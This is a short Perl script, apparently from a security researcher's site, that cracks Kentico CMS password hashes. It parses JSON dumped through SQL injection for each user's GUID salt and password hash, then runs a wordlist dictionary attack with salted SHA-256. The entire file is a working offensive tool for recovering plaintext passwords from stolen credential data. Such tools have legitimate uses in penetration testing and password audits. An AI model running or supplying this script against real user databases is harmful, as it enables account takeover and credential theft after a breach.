#!/usr//bin/perl
# Quick script to crack kentico CMS hashes, source file is expected to be JSON, extracted SQLi, but anything should work, just change the regexes
# Supports salted, but not peppered passwords. YMMV
# Written by Eldar "Wireghoul" Marcussen
# http://www.justanotherhacker.com
#

use strict;
use warnings;

my $pwfile = $ARGV[0];
my $wordfile= $ARGV[1];
my @h;
use Digest::SHA qw(sha256_hex);

print "Cracking passwords from $pwfile using $wordfile\n";
open(my $pfh, $pwfile);
my $c=0;
while (<$pfh>) {
    my $p='';
    my $s='';
    my $d=$_;
    if ($d=~/UserGUID":"([^"]+)"/) {
        $s=$1;
    }
    if ($d=~/UserPassword":"([^"]+)"/){
        $p=$1;
    }
    if ($s && $p) {
      $h[$c][0]=$s;
      $h[$c][1]=$p;
      $c++;
#      print "Processed: $c, $s, $p\n";
    }
}
print "Loaded $c passsword hashes with salt\n";
open(my $wfh, $wordfile);
while (<$wfh>) {
    chomp;
    for (my $x=0;$x<scalar(@h);$x++) {
      my $dg = sha256_hex($_ . $h[$x][0]);
      if ($dg =~ /$h[$x][1]/i) {
          print "Password[$x] $h[$x][1] => $_\n";
      }
  }
}

#print sha256_hex("password");
